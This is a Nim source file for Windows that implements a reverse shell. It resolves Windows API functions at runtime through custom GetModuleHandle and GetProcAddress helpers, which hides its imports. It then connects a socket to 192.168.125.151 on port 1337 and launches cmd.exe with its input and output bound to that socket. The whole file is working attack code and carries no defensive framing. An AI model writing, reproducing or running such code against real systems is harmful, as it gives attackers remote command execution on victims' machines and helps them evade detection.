import winim
import utils/[getmodulehandle, getprocaddress]

# declaring needed functions
type LoadLibraryA   = (proc(lpLibFileName: LPCSTR): HMODULE {.stdcall.})
type WSAStartup     = (proc(wVersionRequested: WORD, lpWSAData: LPWSADATA): int32 {.stdcall.})
type WSASocketA     = (proc(af: int32, `type`: int32, protocol: int32, lpProtocolInfo: LPWSAPROTOCOL_INFOA, g: GROUP, dwFlags: DWORD): SOCKET {.stdcall.})
type inet_addr      = (proc(cp: ptr char): int32 {.stdcall.})
type htons          = (proc(hostshort: uint16): uint16 {.stdcall.})
type connect        = (proc(s: SOCKET, name: ptr sockaddr, namelen: int32): int32 {.stdcall.})
type CreateProcessA = (proc(lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.})

proc main() =
  var 
    sHost = "192.168.125.151".cstring
    port: uint16 = 1337
    wsaData: WSADATA
    sCmd = "cmd".cstring

  var
    sKernel32 = "KERNEL32.dll".cstring
    sws2_32 = "ws2_32.dll".cstring
    sLoadLibraryA = "LoadLibraryA".cstring
    sWSAStartup = "WSAStartup".cstring
    sWSASocketA = "WSASocketA".cstring
    sinet_addr = "inet_addr".cstring
    shtons = "htons".cstring
    sconnect = "connect".cstring
    sCreateProcessA = "CreateProcessA".cstring
  
  var 
    hKernel32 = custom_GetModuleHandle(sKernel32)
    pLoadLibraryA = cast[LoadLibraryA](custom_GetProcAddress(hKernel32, sLoadLibraryA))

  var 
    hws2_32 = pLoadLibraryA(sws2_32)
    pWSAStartup = cast[WSAStartup](custom_GetProcAddress(hws2_32, sWSAStartup))
    pWSASocketA = cast[WSASocketA](custom_GetProcAddress(hws2_32, sWSASocketA))
    pinet_addr = cast[inet_addr](custom_GetProcAddress(hws2_32, sinet_addr))
    phtons = cast[htons](custom_GetProcAddress(hws2_32, shtons))
    pconnect = cast[connect](custom_GetProcAddress(hws2_32, sconnect))
    pCreateProcessA = cast[CreateProcessA](custom_GetProcAddress(hKernel32, sCreateProcessA))

  #[ Actual Code starts here ]#
  # call WSAStartup
  var wsaStartupRes = pWSAStartup(MAKEWORD(2,2), addr wsaData)

  # call WSASocket
  var socket = pWSASocketA(2, 1, 6, NULL, cast[GROUP](0), cast[DWORD](NULL))

  # create sockaddr_in struct
  var sa: sockaddr_in
  sa.sin_family = AF_INET
  sa.sinaddr.S_addr = pinet_addr(addr sHost[0])
  sa.sin_port = phtons(port)

  # call connect
  var connectResult = pconnect(socket, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))

  # call CreateProcessA
  var 
    si: STARTUPINFO
    pi: PROCESS_INFORMATION
  si.cb = cast[DWORD](sizeof(si))
  si.dwFlags = STARTF_USESTDHANDLES
  si.hStdInput = cast[HANDLE](socket)
  si.hStdOutput = cast[HANDLE](socket)
  si.hStdError = cast[HANDLE](socket)

  discard pCreateProcessA(
    NULL,
    cast[LPSTR](addr sCmd[0]),
    NULL,
    NULL,
    TRUE,
    0,
    NULL,
    NULL,
    cast[LPSTARTUPINFOA](addr si),
    addr pi
  )
   


when isMainModule:
  main()